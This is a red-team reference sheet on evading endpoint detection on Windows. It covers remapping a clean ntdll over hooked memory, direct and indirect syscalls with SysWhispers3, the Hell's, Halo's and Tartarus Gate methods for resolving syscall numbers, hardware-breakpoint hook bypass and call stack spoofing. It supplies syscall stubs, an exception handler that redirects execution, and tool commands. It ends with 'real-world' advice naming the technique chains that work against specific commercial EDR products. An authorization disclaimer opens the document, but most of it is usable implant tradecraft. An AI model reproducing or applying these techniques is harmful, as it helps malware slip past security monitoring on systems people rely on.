# Unhook / Direct / Indirect Syscall Technique List

> For authorized red team / adversary emulation / testing your own products only; prohibited for unauthorized targets.

This document summarizes the current mainstream "bypass user-mode hook" techniques, from the classic unhook to the latest hardware breakpoint Blindside.
All techniques are mapped to MITRE ATT&CK T1562.001 / T1027 / T1055, for easy report output.

## 1. Peruns Fart / Fresh Ntdll from disk

### Principle

All EDR hooks live in **ntdll.dll inside the current process's memory**. The on-disk `C:\Windows\System32\ntdll.dll` is clean.
So simply remap the on-disk ntdll into the current process and overwrite the in-memory `.text` section, and the hooks are erased.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (contains EDR hook jmp) │ ◄── overwrite with clean on-disk .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation notes

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // use the native path to evade monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Find the .text section at the new address
// 5. NtProtectVirtualMemory to change the current ntdll .text to RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory restore to RX
```

### Cautions

- `NtProtectVirtualMemory` itself may be hooked → chained problem. Solution: first call `NtProtectVirtualMemory` via **direct syscall**
- Modern EDR already monitors the W operations of `NtProtectVirtualMemory` on ntdll memory, so combine with ETW patch
- Peruns Fart leaves `KERNEL_MODULE_LOAD`, `PROTECTVM` events under ETW-TI — you must suppress ETW first

## 2. Direct Syscall

### Principle

Don't call ntdll's exported functions; write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (value on Win11 24H2; differs per version)
    syscall
    ret
```

The `syscall` instruction jumps directly from user mode to the kernel SSDT, skipping any user-mode hook.

### SysWhispers3 usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stub
syscallsstubs.std.x64.asm  - standard direct syscall
```

In Visual Studio:

```text
1. Add the .asm to the project and enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) to replace the original NtAllocateVirtualMemory
```

### Minimal direct syscall to NtCreateFile (C code skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamically resolve SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // write some bytes (omitted)
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Drawbacks

- The syscall instruction is located in the implant's own `.text` section (not inside ntdll) → kernel-mode telemetry can easily spot "syscall from non-ntdll address"
- This is why indirect syscall exists

## 3. Indirect Syscall

### Principle

The syscall instruction still comes from ntdll.dll (a legitimate address); only the SSN and return address are controlled by us:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of some syscall;ret gadget in ntdll>]   ; the syscall is not inside the implant
```

The gadget jumped to is usually the two-byte `syscall; ret` sequence at the end of an `Nt*` function.
The RIP seen by the kernel-mode ETW provider is a ntdll address, matching the legitimate behavior pattern.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize jmp targets to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; returns SSN -> eax
    call Sw3GetSyscallAddress      ; returns address of syscall;ret in ntdll -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to the legitimate syscall instruction in ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

These three represent the evolution of solving "dynamic SSN resolution".

### Hell's Gate

- Assumes ntdll is not hooked
- At implant startup, iterates ntdll's `Nt*` exports and extracts the SSN from the first 4 bytes `mov eax, <SSN>`
- Pros: doesn't hardcode the SSN, portable across Windows versions
- Cons: if ntdll is already hooked (first byte becomes jmp), extraction fails

### Halo's Gate

- Fixes Hell's Gate's hook problem
- If a function is found to be hooked (not a standard prologue), **scan up / down by ±N functions**
- Exploit the fact that `Nt*` function SSNs in ntdll increase consecutively, and infer the hooked function's SSN from its neighbors

```text
Normal case:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and its SSN is hidden, look at its neighbors:
  previous unhooked export SSN = 0x17
  next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further handles advanced hooks that **modify the SSN but keep the syscall instruction**
- Validates both the SSN and the syscall;ret gadget address
- Combined, the three provide the most stable indirect syscall foundation

### Reference implementation locations (after the bootstrapped git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (includes fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Principle

Use debug registers `DR0-DR3` to set hardware breakpoints at the entry of the EDR hook trampoline;
set up a VEH (Vectored Exception Handler) that, when the breakpoint hits, changes RIP **directly to after the hook trampoline**,
skipping the EDR's detection code and landing on the real syscall section of ntdll.

### Advantages

- No need to write ntdll memory (no `NtProtectVirtualMemory` alert)
- No need to unhook (the hook is still there, just bypassed)
- ETW-TI sees no memory modification

### Implementation skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at the entry of each hooked function (at most 4, with single-step rotate)
// 3. SetThreadContext(thread, &ctx) writes DRx
// 4. When the EDR hook trampoline triggers the hardware breakpoint -> VEH takes over
// 5. VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to ntdll's legitimate syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN is already in eax; R10 = RCX; jump to ntdll's syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- DRx is per-thread → multithreaded programs need it set separately
- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; you must first bypass them with the earlier techniques
- Win11 22H2+ introduces HVCI / some anti-debugging mitigations that may interfere

## 6. Call Stack Spoofing

### Problem

Modern EDR calls `RtlCaptureStackBackTrace` at the kernel entry of syscalls such as `NtAllocateVirtualMemory` / `NtCreateThreadEx`,
captures the full call stack and reports it. The implant's stack shows **non-image-backed memory** frames → high-confidence alert.

### Option A: CallStackSpoofer (William Burgess)

Implementation approach:

1. Before the syscall, swap the current thread stack → to a forged legitimate stack
2. Fill the forged stack frames with an all-legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. After the syscall returns, swap back to the real stack

### Option B: SilentMoonwalk

More aggressive; uses a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (modifies RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace sees the forged stack)
                ↓
                trampoline restores → continue implant code
```

The key is unwinding: make `RtlVirtualUnwind` walk into the forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Real-world OPSEC advice

- call stack spoof + indirect syscall + ETW patch is currently a fairly stable combination against CrowdStrike / SentinelOne
- Spoof during sleep too; spoofing only during execution is not enough (EDR samples periodically)

## 7. Technique selection comparison table

| Technique | Counters | Complexity | Current effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | user-mode hook | Low | Medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | user-mode hook | Low | Low-Medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | user-mode hook + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | hook + no write operations | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | High | High | T1564 |

Recommended real-world chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing callback

unhook is only half of the bypass; the other half is telemetry blinding: go to `references/telemetry-blinding.md`.
